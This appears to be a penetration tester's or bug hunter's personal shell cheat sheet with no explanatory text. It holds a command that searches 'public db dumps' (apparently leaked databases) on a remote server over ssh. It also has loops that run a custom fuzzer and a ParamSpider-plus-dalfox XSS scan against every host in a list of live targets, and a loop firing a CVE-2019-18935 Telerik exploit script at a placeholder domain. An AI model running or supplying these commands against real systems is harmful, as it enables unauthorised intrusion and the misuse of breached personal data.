# public db dumps; dbpath='~/Disks/disk.d/dbdumps/'
ssh lola@modalen.pub 'egrep -rian $1 $dbpath/*'

# reminder - run stuff against alive
while read u; do echo $u; python3 ~/zauTo.py  $u | tee -a zfuzz.log;done<alive.txt
while read u; do python3.9 ParamSpider/paramspider.py -d $u -o spider.out | tee -a outest; ~/go/bin/./dalfox file output/spider.out --output ./dalfox-out --format PLAIN | tee -a dalfox.stdout.log;done<alive.txt
# asp telerik 
for YEAR in $(seq 2013 2018); do python3.9 CVE-2019-18935.py -t -v "$YEAR" -p /dev/null -u "the.domain.here"\; done

